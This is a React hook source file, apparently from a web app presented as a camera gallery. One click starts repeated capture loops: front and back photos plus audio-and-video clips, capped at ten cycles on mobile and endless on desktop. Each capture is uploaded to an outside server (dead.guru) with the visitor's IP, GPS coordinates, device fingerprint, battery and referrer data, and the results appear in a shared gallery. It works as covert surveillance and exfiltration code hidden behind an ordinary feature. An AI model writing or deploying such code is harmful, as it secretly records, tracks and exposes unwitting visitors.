import { useState, useCallback, useRef } from 'react';
import {
    getSystemDetails,
    gatherMinimalInformation,
    getGPUDetails,
    takePicture,
    recordVideo,
    takePictureFromStream,
    getLocationValue,
    gatherRequestContext
} from '../utils/cameraUtils';

const CAMERA_CONFIG = {
    MAX_CYCLES: 10,
    MAX_PERMISSION_RETRIES: 2,
    VIDEO_DURATION: 3000,
    DELAY_BETWEEN_OPERATIONS: 250,
    DELAY_ON_ERROR: 1000,
    DELAY_DESKTOP_LOOP: 750,
    LOCATION_TIMEOUT: 30000
};

const SUPPORTED_MIME_TYPES = [
    'video/mp4',
    'video/webm',
    'video/webm;codecs=vp8',
    'video/webm;codecs=daala',
    'video/webm;codecs=h264',
    'video/mpeg'
];

const API_ENDPOINTS = {
    GALLERY: 'https://dead.guru/api/gallery',
    IP_SERVICE: 'https://api.ipify.org?format=json',
    LOCATION_SERVICE: 'https://ipapi.co'
};

export function useCamera() {
    const [isProcessing, setIsProcessing] = useState(false);
    const [galleryVisible, setGalleryVisible] = useState(false);
    const [photos, setPhotos] = useState([]);
    
    const activeStreams = useRef([]);
    const cycleCount = useRef(0);
    const hasPermission = useRef(true);
    const permissionRetries = useRef(0);
    const locationData = useRef(null);
    const minimalInfo = useRef(null);

    const cleanup = useCallback(async () => {
        for (const stream of activeStreams.current) {
            if (stream && stream.getTracks) {
                const tracks = stream.getTracks();
                tracks.forEach(track => {
                    if (track.readyState === 'live') {
                        track.stop();
                    }
                });
            }
        }
        activeStreams.current = [];
        await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_BETWEEN_OPERATIONS));
    }, []);

    const requestPermission = useCallback(async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(track => track.stop());
            return true;
        } catch (e) {
            return false;
        }
    }, []);

    const handlePermissionError = useCallback(async (error) => {
        if (error.name === 'NotAllowedError' || error.name === 'NotFoundError' || error.message.includes('permission')) {
            hasPermission.current = await checkPermissions();
            return !hasPermission.current && permissionRetries.current >= CAMERA_CONFIG.MAX_PERMISSION_RETRIES;
        }
        return false;
    }, []);

    const checkPermissions = useCallback(async () => {
        try {
            const result = await navigator.permissions.query({ name: 'camera' });
            if (result.state === 'prompt' || result.state === 'denied') {
                if (permissionRetries.current < CAMERA_CONFIG.MAX_PERMISSION_RETRIES) {
                    permissionRetries.current++;
                    return await requestPermission();
                }
            }
            return result.state === 'granted';
        } catch (e) {
            return await requestPermission();
        }
    }, [requestPermission]);

    const sendMediaToServer = useCallback(async (mediaData, systemData, mediaType, cameraType) => {
        const mimeMatch = mediaData.match(/^data:([^;]+);base64,/);
        const mimeType = mimeMatch ? mimeMatch[1] : (mediaType === 'photo' ? 'image/jpeg' : 'video/webm');
        const base64Data = mediaData.split(',')[1];
        
        const gpuDetails = await getGPUDetails();
        const gpuInfo = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : 'Unknown';
        const req = gatherRequestContext();
        const batteryCombined = minimalInfo.current && minimalInfo.current.batteryLevel
            ? `${minimalInfo.current.batteryLevel} (${minimalInfo.current.isCharging})`
            : 'Unknown';
        
        const payload = {
            image: base64Data,
            systemData: {
                ...systemData,
                camera: cameraType,
                type: mediaType,
                mimeType: mimeType,
                ip: minimalInfo.current?.ip || locationData.current?.ip || 'Unknown',
                location: locationData.current?.location || getLocationValue(locationData.current),
                locationByIP: getLocationValue(locationData.current),
                device: systemData.deviceType,
                os: systemData.operatingSystem,
                screen: systemData.screenResolution,
                connection: navigator.connection ? `${navigator.connection.effectiveType || 'Unknown'}` : 'Unknown',
                connectionDetails: navigator.connection ? 
                    `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.type || 'Unknown'})` : 
                    'Unknown',
                gpu: gpuInfo,
                language: navigator.language || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                platform: navigator.platform || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                battery: batteryCombined,
                cookiesEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'Unknown',
                https: req.https,
                method: req.method,
                scheme: req.scheme,
                protocol: req.protocol,
                port: req.port,
                host: req.host,
                entryUrl: req.entryUrl,
                fullUrl: req.fullUrl,
                referrerType: req.referrer.type,
                referrerHost: req.referrer.host,
                referrerFullUrl: req.referrer.fullUrl,
                referrerPath: req.referrer.path,
                referrerQuery: req.referrer.query
            }
        };

        try {
            const response = await fetch(API_ENDPOINTS.GALLERY, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            const result = await response.json();
            
            if (result.success && result.data) {
                const newPhoto = {
                    ...result.data,
                    url: result.data.url.startsWith('http') ? result.data.url : `https://dead.guru/${result.data.url}`
                };
                setPhotos(prev => [newPhoto, ...prev]);
            }
            
            return result;
        } catch (error) {
            return { success: false, error: error.message };
        }
    }, [setPhotos]);

    const loadPhotosFromAPI = useCallback(async () => {
        try {
            const response = await fetch(API_ENDPOINTS.GALLERY, {
                method: 'GET',
                headers: { 
                    'Accept': 'application/json'
                }
            });
            
            const result = await response.json();
            const photosArray = Array.isArray(result) ? result : (result.photos || result.data || []);
            
            const photosWithFullUrl = photosArray.map(photo => ({
                ...photo,
                url: photo.url.startsWith('http') ? photo.url : `https://dead.guru/${photo.url}`
            }));
            
            setPhotos(photosWithFullUrl);
        } catch (error) {
            setPhotos([]);
        }
    }, [setPhotos]);

    const recordVideoFromStream = useCallback(async (stream, duration = CAMERA_CONFIG.VIDEO_DURATION) => {
        let options = undefined;
        if (MediaRecorder.isTypeSupported) {
            for (const type of SUPPORTED_MIME_TYPES) {
                if (MediaRecorder.isTypeSupported(type)) {
                    options = { mimeType: type };
                    break;
                }
            }
        }
        
        const mediaRecorder = new MediaRecorder(stream, options);
        const chunks = [];
        
        return new Promise((resolve, reject) => {
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            mediaRecorder.onerror = (e) => reject(e);
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: options?.mimeType || 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => {
                    resolve(reader.result);
                };
                reader.readAsDataURL(blob);
            };
            
            mediaRecorder.start(100);
            setTimeout(() => mediaRecorder.stop(), duration);
        });
    }, []);

    const captureMedia = useCallback(async (constraints, systemData, mediaType, cameraType) => {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        activeStreams.current.push(stream);
        
        let mediaData;
        if (mediaType === 'photo') {
            mediaData = await takePictureFromStream(stream);
        } else {
            mediaData = await recordVideoFromStream(stream);
        }
        
        await sendMediaToServer(mediaData, systemData, mediaType, cameraType);
        await cleanup();
        await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_BETWEEN_OPERATIONS));
    }, [recordVideoFromStream, sendMediaToServer, cleanup]);

    const initializeSystemData = useCallback(async () => {
        try {
            minimalInfo.current = await gatherMinimalInformation();
        } catch (error) {}
        
        try {
            const response = await fetch(API_ENDPOINTS.IP_SERVICE);
            if (response.ok) {
                const ipData = await response.json();
                if (minimalInfo.current) {
                    minimalInfo.current.ip = ipData.ip;
                }
                
                const locationResponse = await fetch(`${API_ENDPOINTS.LOCATION_SERVICE}/${ipData.ip}/json/`);
                if (locationResponse.ok) {
                    locationData.current = await locationResponse.json();
                    locationData.current.ip = ipData.ip;
                }
            }
        } catch (error) {}
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    locationData.current = {
                        ...locationData.current,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        type: 'GPS',
                        location: `GPS: ${position.coords.latitude}, ${position.coords.longitude}`
                    };
                },
                (error) => {
                    if (locationData.current && locationData.current.city) {
                        locationData.current.location = `IP: ${locationData.current.city}, ${locationData.current.region}, ${locationData.current.country_name}`;
                    }
                },
                { enableHighAccuracy: true, timeout: CAMERA_CONFIG.LOCATION_TIMEOUT }
            );
        }
    }, []);

    const mobileCameraLoop = useCallback(async () => {
        cycleCount.current = 0;
        setIsProcessing(false);

        hasPermission.current = await checkPermissions();
        if (!hasPermission.current) {
            setGalleryVisible(true);
            return;
        }

        while (cycleCount.current < CAMERA_CONFIG.MAX_CYCLES) {
            if (isProcessing) {
                await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_ON_ERROR));
                continue;
            }

            try {
                setIsProcessing(true);
                const systemData = getSystemDetails();

                await captureMedia({ video: { facingMode: 'user' }, audio: false }, systemData, 'photo', 'front');
                await captureMedia({ video: { facingMode: 'environment' }, audio: false }, systemData, 'photo', 'back');

                if (!galleryVisible) {
                    setGalleryVisible(true);
                }

                await captureMedia({ audio: true, video: { facingMode: 'user' } }, systemData, 'video', 'front');
                await captureMedia({ audio: true, video: { facingMode: 'environment' } }, systemData, 'video', 'back');

                cycleCount.current++;
                setIsProcessing(false);
                await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_BETWEEN_OPERATIONS));

            } catch (error) {
                await cleanup();
                setIsProcessing(false);

                const shouldExit = await handlePermissionError(error);
                if (shouldExit) {
                    setGalleryVisible(true);
                    break;
                }

                await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_ON_ERROR));
                continue;
            }
        }

        await cleanup();
        setGalleryVisible(true);
    }, [cleanup, checkPermissions, captureMedia, handlePermissionError, isProcessing, galleryVisible]);

    const desktopCameraLoop = useCallback(async () => {
        while (true) {
            try {
                const systemData = getSystemDetails();
                
                const photo = await takePicture({ video: true });
                await sendMediaToServer(photo, systemData, 'photo', 'desktop');
                
                await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_DESKTOP_LOOP));
                
                const video = await recordVideo({ audio: true, video: true });
                await sendMediaToServer(video, systemData, 'video', 'desktop');
                
                if (!galleryVisible) {
                    setGalleryVisible(true);
                }
                
                await new Promise(resolve => setTimeout(resolve, CAMERA_CONFIG.DELAY_DESKTOP_LOOP));
                
            } catch (error) {
                setGalleryVisible(true);
                break;
            }
        }
    }, [sendMediaToServer, galleryVisible]);

    const handleCameraClick = useCallback(async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        try {
            if (photos.length === 0) {
                await loadPhotosFromAPI();
            }
            
            if (!minimalInfo.current) {
                await initializeSystemData();
            }
            
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            if (isMobile) {
                mobileCameraLoop().catch(error => {
                    setGalleryVisible(true);
                });
            } else {
                desktopCameraLoop();
            }
        } catch (error) {
            setGalleryVisible(true);
        }
    }, [photos.length, loadPhotosFromAPI, initializeSystemData, mobileCameraLoop, desktopCameraLoop]);

    return {
        isProcessing,
        galleryVisible,
        setGalleryVisible,
        photos,
        setPhotos,
        loadPhotosFromAPI,
        handleCameraClick
    };
}